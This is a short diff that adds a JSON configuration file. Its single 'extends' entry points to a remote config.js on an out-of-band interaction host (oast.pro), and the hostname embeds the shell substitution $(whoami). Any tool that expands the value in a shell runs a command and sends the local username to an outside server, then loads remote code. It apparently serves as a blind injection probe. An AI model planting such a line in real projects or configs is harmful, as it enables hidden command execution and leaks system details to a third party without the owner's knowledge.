@@ -1,0 +1,3 @@
+{
+  "extends": "http://$(whoami).1077aec535d9857caf5egufzncoyyyyyf.oast.pro/config.js"
+}
